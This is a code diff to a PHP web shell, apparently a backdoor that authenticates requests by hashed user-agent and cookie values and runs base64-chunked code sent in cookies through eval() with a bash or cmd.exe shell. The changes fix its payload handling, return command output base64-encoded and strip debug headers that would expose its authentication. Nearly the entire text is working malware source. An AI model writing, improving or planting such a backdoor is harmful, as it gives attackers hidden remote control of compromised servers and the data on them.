@@ -18,7 +18,7 @@ if (function_exists("sodium_crypto_aead_chacha20poly1305_decrypt") && function_e
     }
 }
 
-if (!defined("os")) {
+if (!defined("slopos")) {
     define("slopos", strtoupper(substr(PHP_OS, 0, 3)));
 }
 $shell = (slopos === 'WIN') ? 'cmd.exe' : 'bash';
@@ -145,9 +145,8 @@ function banner()
     }
 }
 
-
 // removing b64, replacing with chunked file transfer.
-function chunkFileTransfer($fname, $data, $count, $chunk): string
+function chunkFileTransfer($fname, $data, $count, $chunk): array
 {
     $da = "";
     $sum = md5($data);
@@ -165,14 +164,14 @@ function chunkFileTransfer($fname, $data, $count, $chunk): string
     if ($count === $chunk){
         foreach (glob(sprintf("%s/*", $g), GLOB_MARK) as $ff){
             if (!is_dir($ff)){
-                $da += base64_decode(trim(file_get_contents($ff)));
+                $da .= base64_decode(trim(file_get_contents($ff)));
                 unlink($ff);
             }
         }
         unlink($g);
-        return eval($da);
+        return ["checksum" => null, "d" => base64_encode(eval($da))];
     }
-    return $sum;
+    return ["checksum" => base64_encode($sum), "d" => null];
 }
 
 function checkComs(): array
@@ -300,15 +299,11 @@ function remoteFileInclude($targetFile)
 function validate_auth($agent, $cookie_val, $uuid): bool
 {
     if (is_null($agent) || is_null($cookie_val) || is_null($uuid)) {
-        header(sprintf("Faliure: Auth did not work, all or one value was null - agent %s, cookie_val %s, uuid %s", is_null($agent), is_null($cookie_val), is_null($uuid)));
-        header(sprintf("FailReason: agent - %s, cookie_val - %s, uuid - %s", sha1($agent), sha1($cookie_val), sha1($uuid)));
         return false;
     }
     if (hash_equals(allow_agent, sha1($agent)) && hash_equals(cval, sha1($cookie_val)) && hash_equals(uuid, sha1($uuid))) {
-        header("Success: Auth worked!");
         return true;
     } else {
-        header(sprintf("GeneralFailure: Auth failed. agent - %s, cookie_val - %s, uuid - %s, expecting: %s %s %s", $agent, $cookie_val, $uuid, $agent, cval, uuid));
         return false;
     }
 }
@@ -385,7 +380,11 @@ function slopp()
                 $putData = $_COOKIE['token'];
                 $f = $_COOKIE['t'];
                 $a = chunkFileTransfer($f, $putData);
-                header(sprintf("MD5: %s", $a));
+                if (!is_null($a['checksum'])) {
+                    header(sprintf("MD5: %s", $a['checksum']));
+                }else{
+                    header(sprintf("MD5: %s", $a['d']));
+                }
                 break;
             case (isset($_COOKIE['qs'])):
                 $qs = [];
